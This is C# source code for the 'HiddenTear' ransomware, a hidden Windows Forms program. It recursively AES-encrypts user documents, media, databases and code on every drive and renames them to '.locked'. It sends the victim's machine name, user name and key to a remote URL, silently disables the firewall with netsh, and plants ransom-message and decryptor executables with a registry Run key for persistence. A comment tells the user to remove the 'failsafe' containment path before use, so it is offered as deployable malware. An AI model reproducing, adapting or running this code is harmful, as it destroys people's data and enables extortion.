using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace HiddenTear
{
    public partial class Form1 : Form
    {
        readonly string URL = "";                                          //https://www.example.com/hidden-tear/write.php?info=
        readonly string LOGURL = "";                                       //https://www.example.com/hidden-tear/write.php?info=
        readonly string CONTAINMENTPATH = "failsafe";                      //remove before using

        readonly int PASSLENGTH = 32;
        readonly byte[] SALT = new byte[] { 11, 46, 18, 4, 19, 0, 7, 62 };
        readonly string[] EXTENTIONS = new[]
        {
                ".txt", ".doc", ".docx", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd", ".wps",//Text Files
                ".csv", ".dat", ".ged", ".key", ".keychain", ".pps", ".ppt", ".pptx", ".sdf", ".tar", ".tax2014", ".tax2015", ".vcf", ".xml", //Data Files
                ".aif", ".iff", ".m3u", ".m4a", ".mid", ".mp3", ".mpa", ".wav", ".wma", //Audio Files
                ".3g2", ".3gp", ".asf", ".avi", ".flv", ".m4v", ".mov", ".mp4", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", //Video Files
                ".3dm", ".3ds", ".max", ".obj", //3D Image Files
                ".bmp", ".dds", ".gif", ".jpg", ".png", ".psd", ".tga", ".thm", ".tif", ".tiff", ".yuv", //Raster Image Files
                ".ai", ".eps", ".ps", ".svg", //Vector Image Files
                ".indd", ".pct", ".pdf", //Page Layout Files
                ".xlr", ".xls", ".xlsx", //Spreadsheet Files
                ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", //Database Files
                ".dwg", ".dxf",//CAD Files
                ".asp", ".aspx", ".cer", ".cfm", ".csr", ".css", ".htm", ".html", ".js", ".jsp", ".php", ".rss", ".xhtml", //Web Files
                ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rar", ".rpm", ".sitx", ".tar.gz", ".zip", ".zipx", //Compressed Files
                ".bin", ".cue", ".dmg", ".iso", ".mdf", ".toast", ".vcd", //Disk Image Files 
                ".c", ".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".java", ".lua", ".m", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj", //Developer Files
                ".bak", ".tmp", //Backup Files
                ".crdownload", ".ics", ".msi", ".part", ".torrent", //Misc Files
        };      //http://fileinfo.com/filetypes/common




        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            log("opened");
            Opacity = 0;
            this.ShowInTaskbar = false;
            startAction();
        }
        private void Form1_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }
        void log(string message)
        {
            if (string.IsNullOrEmpty(LOGURL)) return; 
            string info = Environment.MachineName + "-" + Environment.UserName + " : " + message;
            var fullUrl = LOGURL + info;

            using (System.Net.WebClient client = new System.Net.WebClient())
            {
                string testie = "";
                try
                {
                    testie = client.DownloadString("google.com");
                }
                catch { }

                if (!string.IsNullOrEmpty(testie))
                {
                    try
                    {
                        var content = client.DownloadString(fullUrl);
                    }
                    catch { }
                }
                else
                {
                    try
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "netsh firewall set opmode disable";
                        process.StartInfo = startInfo;
                        process.Start();

                        process.WaitForExit();

                        var content = client.DownloadString(fullUrl);
                    }
                    catch { }
                }
            }
        }


        void startAction()
        {
            string password = createPassword(PASSLENGTH);

            if (!string.IsNullOrEmpty(CONTAINMENTPATH))
            {
                encryptDirectory(CONTAINMENTPATH, password);
            }
            else
            {
                var sensitiveDirs = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
                };
                foreach (string str in sensitiveDirs)
                {
                    encryptDirectory(str, password);
                }

                string[] drives = System.IO.Directory.GetLogicalDrives();
                foreach (string str in drives)
                {
                    encryptDirectory(str, password);
                }
            }

            dropFiles();
            if (URL != "") sendPassword(password);        
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        string createPassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }
        void sendPassword(string password)
        {
            if (string.IsNullOrEmpty(URL)) return;
            string info =   Environment.MachineName + "-" + 
                            Environment.UserName + " " + 
                            password;
            var fullUrl = URL + info;

            using (System.Net.WebClient client = new System.Net.WebClient())
            {
                string testie = "";
                try
                {
                    testie = client.DownloadString("google.com");
                }
                catch { }

                if (!string.IsNullOrEmpty(testie))
                {
                    try
                    {
                        var content = client.DownloadString(fullUrl);
                    }
                    catch { }
                }
                else
                {
                    try
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "netsh firewall set opmode disable";
                        process.StartInfo = startInfo;
                        process.Start();

                        process.WaitForExit();

                        var content = client.DownloadString(fullUrl);
                    }
                    catch { }
                }
            }
        }
        void encryptDirectory(string location, string password)
        {
            try
            {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (EXTENTIONS.Contains(extension.ToLower()))
                    {
                        encryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i], password);
                }
            }
            catch { }
        }
        void encryptFile(string file, string password)
        {
            try
            {
                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = encryptAES(bytesToBeEncrypted, passwordBytes);

                File.WriteAllBytes(file, bytesEncrypted);
                System.IO.File.Move(file, file + ".locked");
                crypted.Add(file);
            }
            catch { }
        }
        byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, SALT, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }



        List<string> crypted = new List<string>();
        void dropFiles()
        {
            if (crypted.Count < 1) return;

            byte[] decryptorBuffer = default(byte[]);
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("HiddenTear.Embedded.HiddenTear-Decrypt.exe");
            using (var memstream = new MemoryStream())
            {
                stream.CopyTo(memstream);
                decryptorBuffer = memstream.ToArray();
            }

            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\HTDecryptor.exe", decryptorBuffer); } catch {}
            try { File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\HTDecryptor.exe", decryptorBuffer); }catch {}


            byte[] messageBuffer = default(byte[]);
            var stream1 = Assembly.GetExecutingAssembly().GetManifestResourceStream("HiddenTear.Embedded.HiddenTear-Message.exe");
            using (var memstream = new MemoryStream())
            {
                stream1.CopyTo(memstream);
                messageBuffer = memstream.ToArray();
            }

            try
            {
                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\message.exe", messageBuffer);
            } catch { }
            try
            {            
                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe", messageBuffer);
            } catch { }
            try
            {
                RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                add.SetValue("Message",
                    "\"" + Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe" + "\"");
            }
            catch { }


            try
            {
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");
            }
            catch { }
        }
    }
}
